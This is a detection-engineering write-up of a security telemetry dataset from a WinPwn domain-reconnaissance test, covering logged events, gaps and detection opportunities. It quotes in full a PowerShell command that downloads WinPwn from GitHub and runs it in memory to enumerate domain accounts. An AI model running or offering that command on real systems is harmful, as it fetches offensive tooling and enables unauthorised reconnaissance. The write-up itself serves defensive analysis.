# T1087.002-15: Domain Account — WinPwn - generaldomaininfo

## Technique Context

T1087.002 (Account Discovery: Domain Account) encompasses multi-function frameworks that automate comprehensive domain reconnaissance. WinPwn is a PowerShell post-exploitation framework by S3cur3Th1sSh1t that wraps numerous offensive techniques into single-function calls. The `generaldomaininfo` module performs a broad sweep of domain information: enumerating domain users, groups, computers, GPOs, trusts, and administrative tiers in one automated pass. It is designed for rapid environment mapping immediately after initial access.

The delivery mechanism is identical to T1082-21 and T1082-22: downloading a PowerShell script from a known GitHub URL via `iex(new-object net.webclient).downloadstring(...)` and executing a named function. In the defended dataset, Defender blocked execution before WinPwn downloaded. With Defender disabled, the download succeeds and `generaldomaininfo` runs.

## What This Dataset Contains

This dataset covers a 5-second window (2026-03-14T23:34:25Z–23:34:30Z).

**Process execution chain**: Sysmon EID 1 captures three events. `whoami.exe` (PID 4160) at 23:34:26. The main PowerShell process (PID 7128) at 23:34:28 with command line:

```
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
generaldomaininfo -noninteractive -consoleoutput}
```

Tagged `technique_id=T1059.001,technique_name=PowerShell`. The URL references a specific commit hash (`121dcee26a7aca368821563cbe92b2b5638c5773`), indicating this is a pinned version of WinPwn. The `-noninteractive -consoleoutput` flags configure WinPwn to run without prompting and write output to the console rather than opening GUI windows. A second `whoami.exe` (PID 6276) at 23:34:31 closes the window.

**Network activity**: Sysmon EID 22 records a DNS query for `raw.githubusercontent.com` resolving to `185.199.108-111.133` at 23:34:25, from the PowerShell process (PID 7128). The download succeeded at the network layer, unlike the defended run where Defender blocked before or during download.

**Security events**: Three EID 4688 events cover `whoami.exe`, `powershell.exe`, and a second `whoami.exe`. The PowerShell EID 4688 entry captures the full command line with the WinPwn URL.

**PowerShell script block logging**: 107 EID 4104 events and 1 EID 4103 event were captured (109 total). The 107 EID 4104 events represent the most valuable evidence: WinPwn.ps1 is a large framework, and its complete content would be split across dozens of EID 4104 script blocks as PowerShell logged it before execution. The individual function definitions for `generaldomaininfo` and its dependencies appear in this set.

**DLL loading**: 17 Sysmon EID 7 events reflect .NET and PowerShell DLL loading. No Defender DLLs appear.

**Process access**: Three Sysmon EID 10 events show test framework process access patterns.

**Named pipe**: Two Sysmon EID 17 events for two PowerShell instance pipes.

**Application channel**: A single EID 15 event indicating Defender status restored to `SECURITY_PRODUCT_STATE_ON` after the test completes.

Comparing to the defended dataset (35 sysmon, 11 security, 51 powershell): the undefended run has 27 sysmon, 3 security, and 109 powershell events. The powershell event count is more than double the defended count (109 vs 51), directly reflecting WinPwn's successful download and execution generating extensive script block logging. The security count dropped (3 vs 11), as Defender's blocking activity is absent.

## What This Dataset Does Not Contain

The domain information gathered by `generaldomaininfo` — user accounts, groups, computers, GPO settings, trusts — does not appear in any event. WinPwn's `-consoleoutput` flag means results go to the PowerShell console within the executing process, not to log files or separate processes. No LDAP query details, no domain controller network connections, and no enumeration results are captured in this telemetry.

The WinPwn script likely generates subprocess calls during execution (e.g., to `net.exe`, `nltest.exe`, or LDAP client libraries), but these additional process creations are not in the available 20-sample set if they fall outside the 3 EID 1 events captured.

## Assessment

This dataset demonstrates successful end-to-end execution of a multi-technique domain reconnaissance framework (WinPwn) delivered via in-memory download-and-execute, with Defender disabled. The primary indicators are the PowerShell command line with the specific WinPwn GitHub URL (including commit hash) and the DNS resolution to `raw.githubusercontent.com`.

The 107 EID 4104 script block events contain WinPwn's complete source code as logged by PowerShell before execution. This is the richest evidence source — WinPwn's function names, its internal technique invocations, and potentially its output can be extracted from these blocks.

The pinned commit hash in the download URL is useful for attribution: it identifies the specific version of WinPwn used, which can be matched against threat intelligence.

## Detection Opportunities Present in This Data

**Sysmon EID 1 / Security EID 4688**: The command line contains `S3cur3Th1sSh1t/WinPwn` — a known offensive framework URL. The specific commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` can be used for attribution. The `generaldomaininfo -noninteractive -consoleoutput` function call is a direct indicator.

**Sysmon EID 22 (DNS Query)**: DNS resolution for `raw.githubusercontent.com` from SYSTEM-context PowerShell at 23:34:25 — the same pattern as T1082-21 and T1082-22, suggesting all three WinPwn/PowerSharpPack tests share a common DNS-based detection anchor.

**PowerShell EID 4104**: WinPwn's function names (`generaldomaininfo`, `Invoke-WinPwn`, and its dependencies) will appear across the 107 script block events. These are known signatures that appear in threat intelligence for this framework.

**Temporal correlation**: This test executes at 23:34:28, 9 seconds after T1087.002-12 (ADSISearcher) and 9 seconds before T1087.002-21 (AdFind). The clustering of three domain enumeration techniques within 30 seconds, all as SYSTEM, is a strong indicator of systematic AD reconnaissance.
